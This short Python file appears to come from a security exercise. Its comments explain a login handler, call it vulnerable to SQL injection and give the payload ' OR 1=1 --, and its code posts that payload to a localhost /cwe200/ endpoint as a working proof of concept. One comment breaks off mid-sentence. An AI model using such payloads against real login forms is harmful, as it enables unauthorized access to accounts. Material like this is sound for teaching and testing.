
#
#1. It is connecting to the database
#2. It is executing a query to get the username and password hash from the database
#3. It is comparing the password hash from the database with the password that the user entered
#4. If the password hash from the database matches the password that the user entered, then the user is redirected to the /cwe200/username page
#5. If the password hash from the database does not match the password that the user entered, then the user is redirected to the /cwe200/ page
#
#The problem with the above code is that it is vulnerable to SQL injection.
#
#The following is an example of a SQL injection attack:
#
#username: admin
#password: ' OR 1=1 --
#
#The above SQL injection attack will cause the following query to be executed:
#
#SELECT * FROM users WHERE username = 'admin' AND password = '' OR 1=1 --'
#
#The above query

import requests

url = "http://localhost:5000/cwe200/"

username = "admin"
password = "' OR 1=1 --"

r = requests.post(url, data={"username": username, "password": password})

print(r.text)